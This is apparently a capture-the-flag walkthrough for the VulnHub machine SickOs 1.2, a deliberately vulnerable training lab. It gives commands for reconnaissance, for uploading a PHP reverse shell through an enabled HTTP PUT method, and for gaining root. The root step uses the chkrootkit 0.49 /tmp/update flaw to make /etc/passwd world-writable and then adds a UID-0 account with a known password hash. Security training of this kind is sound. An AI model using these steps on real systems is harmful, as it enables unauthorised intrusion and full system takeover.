# Machine Link
https://www.vulnhub.com/entry/sickos-12,144/

# IP
192.168.1.3

Nmap Scan :
```bash
nmap -v -p- -sC -sV -sT -A 192.168.1.3
```
<img width="927" height="267" alt="image" src="https://github.com/user-attachments/assets/183e4ef9-a9ac-4a28-901c-d3aa08d7f21f" />



Using dirsearch for directory bruteforcing we found a directory named test :

```bash
dirsearch -u http://192.168.1.3 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```
<img width="1918" height="503" alt="image" src="https://github.com/user-attachments/assets/459af4c5-b19a-4b5a-8866-c44c8843af54" />


We found out a directory named test which has directory listing enabled :
<img width="617" height="275" alt="image" src="https://github.com/user-attachments/assets/e0b0729c-48aa-4951-993f-57659a60ebf2" />


Lets check the HTTP options on this directory by using curl :
```bash
curl -I -X OPTIONS http://192.168.1.3/test
```
<img width="945" height="230" alt="image" src="https://github.com/user-attachments/assets/bd90da55-21f0-47bb-8838-26730f8cbcbb" />


Here we have the PUT method enabled, so lets use the `--file-upload` switch in curl to upload a reverse-shell file to the test directory.
(make changes to your ip and port in the php-reverse-shell.php code)
```bash
curl --upload-file /tmp/php-reverse-shell.php http://192.168.1.3/test/shell.php
```
<img width="1213" height="652" alt="image" src="https://github.com/user-attachments/assets/4cd96021-61b9-410f-8829-b3331a7b2806" />


Now start a listner and hit the shell.php file :
<img width="1916" height="959" alt="image" src="https://github.com/user-attachments/assets/c97efbb9-56dd-40b9-97d2-233c2712aec7" />

We got the shell!!!

---
# Privilege Escalation

NOTE* With the help of LES (Linux Exploit Suggester) i found the dirtycow exploit and it was working by making a firefart named root user, but for some reason it keeps crashing the machine with a prompt _restart the machine_. So alternate way of cronjob is used below for priv esc.

Check the crontabs :

```bash
www-data@ubuntu:/$ cd /etc/cron.daily

www-data@ubuntu:/etc/cron.daily$ ls -lha
```
<img width="694" height="392" alt="image" src="https://github.com/user-attachments/assets/6d7b09ba-11e9-4e5d-be63-4fd6cb40f5d6" />


We found this chkrootkit binary. Checking the version we found to be 0.49:
<img width="868" height="325" alt="image" src="https://github.com/user-attachments/assets/a2cae64b-a348-4c4f-b9c3-e48fe53cac84" />


On searching the exploit/vulnerabilities of this version we found this :
[Chkrootkit 0.49 - Local Privilege Escalation](https://www.exploit-db.com/exploits/33899)



This tells that create a file named update on /tmp location and run **chkrootkit** which will be done through cronjob.

```bash
cd /tmp

nano update

	chmod 777 /etc/passwd
```


Now after some time the permission of /etc/passwd will change to 777.
Edit the /etc/passwd file :

```bash
nano /etc/passwd

#add this line
root1:$1$XMu3H6Jr$57VxIXZ7PlOcrk98Ww/OI0:0:0:root:/root:/bin/bash
```


Now switch to root1 user with 123 as password :
```bash
su - root1
123
```

We got the root shell!!!
<img width="1916" height="603" alt="image" src="https://github.com/user-attachments/assets/9107c325-7e33-48d9-93d8-ac900d6274ac" />

---
